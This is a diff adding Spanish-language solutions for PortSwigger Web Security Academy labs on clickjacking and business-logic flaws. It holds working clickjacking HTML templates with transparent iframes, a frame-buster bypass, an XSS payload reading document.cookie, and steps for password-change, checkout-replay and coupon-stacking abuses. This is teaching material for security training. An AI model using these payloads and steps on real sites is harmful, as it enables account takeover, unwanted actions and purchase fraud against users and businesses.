@@ -428,6 +428,114 @@ Para resolver este laboratorio, después de autenticarse con las credenciales pr
 <iframe src="https://ac411f041eabd7098042860e00170056.web-security-academy.net/account"></iframe>
 ```
 
+### [Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)
+
+El objetivo del laboratorio es cambiar la dirección de correo electrónico del usuario rellenando previamente un formulario utilizando parámetros URL e intentar engañarlo para que haga click en un botón "Update Email" sin que el mismo sepa.
+
+Para resolver este laboratorio, después de autenticarse con las credenciales provistas, dirigirse a Change Email, y tomando esta url, la ponemos en el src del siguiente iframe, seguido del parámetro email.
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top:560px;
+        left: 60px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://ac681f121f04aa6b80980439004b0021.web-security-academy.net/email?email=alguien@algo.com"></iframe>
+```
+
+### [Clickjacking with a frame buster script](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)
+
+Este laboratorio está protegido por un frame buster que evita que se ejecute un frame en el sitio web. El objetivo es evitar el frame buster y realizar un ataque clickjacking que ejecute un Update Email.
+
+La solución a este laboratorio es la misma que el anterior, pero agregando el atributo sandbox="allow-forms" en el tag del iframe.
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top:510px;
+        left: 80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe sandbox="allow-forms" src="https://ac791f371e807c5c8070fc3c01b80050.web-security-academy.net/email?email=alguien@algo.com"></iframe>
+```
+
+### [Exploiting clickjacking vulnerability to trigger DOM-based XSS](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)
+
+Este laboratorio contiene una vulnerabilidad XSS que se activa con un click. El objetivo es construir un ataque de clickjacking para ejecutar un XSS payload que imprime un alert con el contenido de document.cookie.
+
+Al ir a la sección Submit Feedback y enviar un formulario, vemos que se imprime el nombre, por lo que se puede buscar el XSS mediante el envío de dicho parámetro como se muestra a continuación:
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top:620px;
+        left: 80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://acc01f561e12d7bb8043912700a00045.web-security-academy.net/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=alguien@algo.com&subject=alguno&message=hello#feedbackResult"></iframe>
+```
+
+### [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)
+
+En este laboratorio se deben tener dos elementos en los que el usuario deberá hacer click uno antes que el otro, debido a que la intención es eliminar la cuenta del mismo, para lo cual deberá hacer un click primeramente para iniciar la acción de eliminar la cuenta, y luego otro click de confirmación para que la cuenta sea eliminada.
+
+Para resolver este laboratorio, vamos a la sección Account Actions, copiamos la url y la pegamos en el src del siguiente iframe:
+
+```html
+<style>
+    iframe {
+        position: relative;
+        width: 500px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    .first, .next {
+        position: absolute;
+        top: 330px;
+        left: 50px;
+        z-index: 1;
+    }
+    .next {
+        left: 200px;
+    }
+</style>
+<div class="first">Click me first</div>
+<div class="next">Click me next</div>
+<iframe src="https://ac391f251e65efb180df32b2007d0066.web-security-academy.net/account"></iframe>
+```
+
 ---
 
 ## [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
@@ -1517,6 +1625,51 @@ Se pueden pedir hasta 99 unidades de cada producto por vez, pero esto se puede r
 3. Repetir la request anterior 323 veces. El total de unidades debería ser 32076 y el precio de la orden -\$64.060,96
 4. Añadir otros producto de manera que el precio quede entre $0 y $100 (por ejemplo 47 unidades de Lightweight "l33t" Leather Jacket y 16 unidades de Conversation Controlling Lemon: 47 \* $1337 + 16 \* $80.72 = 64.130,52)
 5. Completar la orden
+
+### [Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)
+
+No pudimos resolver el laboratorio porque se requiere usar las Engagement tools (dentro de Target -> Site map), que sólo están disponibles en la versión Pro de Burp Suite.
+
+### [Inconsistent security controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)
+
+No pudimos resolver el laboratorio porque se requiere usar las Engagement tools (dentro de Target -> Site map), que sólo están disponibles en la versión Pro de Burp Suite.
+
+### [Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)
+
+Para resolver este laboratorio se debe:
+
+1. Iniciar sesión en el sitio vulnerable, ir a "My account", activar Intercept y cambiar la contraseña.
+2. En la request interceptada, eliminar el parámetro `current-password`.
+3. En la misma request, cambiar el valor del parámetro `username` por `administrator`.
+4. *Forwardear* la request.
+5. Cerrar sesión e iniciar sesión como administrator con la contraseña cambiada.
+6. Ir al panel de administración y eliminar al usuario carlos.
+
+### [Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)
+
+1. Con Intercept activado, iniciar sesión y comprar cualquier producto que esté dentro del crédito disponible (por ejemplo, un *Beat the Vacation Traffic*).
+2. La última request interceptada, cuando se compra algo (la de `POST /cart/checkout`), redirige a una página que confirma que la compra fue exitosa. Esa request hay que enviar a Repeater.
+3. Agregar un *Lightweight l33t leather jacket* al carrito.
+4. Con Repeater volver a enviar la request de confirmación de compra. La compra se completa y no se descuenta saldo.
+
+### [Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)
+
+No pudimos resolver el laboratorio porque se requiere usar las Engagement tools (dentro de Target -> Site map), que sólo están disponibles en la versión Pro de Burp Suite.
+
+### [Flawed enforcement of business rules](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules)
+
+Para resolver este laboratorio se debe:
+
+1. Iniciar sesión en el sitio vulnerable. Los nuevos usuarios pueden usar el cupón de descuento `NEWCUST5`.
+2. Al final de la página, suscribirse al *newsletter*. Entonces se puede usar otro código más, `SIGNUP30`.
+3. Agregar un *Lightweight l33t leather jacket* al carrito.
+4. Ir al checkout y aplicar ambos cupones.
+5. Si se intenta aplicar dos veces seguidas un mismo cupón, sale un error. Sin embargo, si se van alternando los cupones, no da ningún error.
+6. Reutilizar ambos cupones hasta que el total de la compra sea menor al saldo disponible y comprar el producto.
+
+### [Infinite money logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)
+
+### [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
 
 ---
 
